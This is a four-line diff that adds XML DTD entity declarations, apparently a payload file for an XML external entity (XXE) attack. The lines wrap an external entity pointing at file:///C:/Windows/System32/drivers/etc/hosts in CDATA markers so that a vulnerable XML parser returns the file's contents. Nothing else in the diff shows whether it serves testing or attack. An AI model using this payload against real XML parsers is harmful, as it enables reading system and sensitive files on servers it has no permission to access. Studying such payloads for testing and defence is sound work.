@@ -1,0 +1,4 @@
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+<!ENTITY fileContents "%start;%file;%end;">
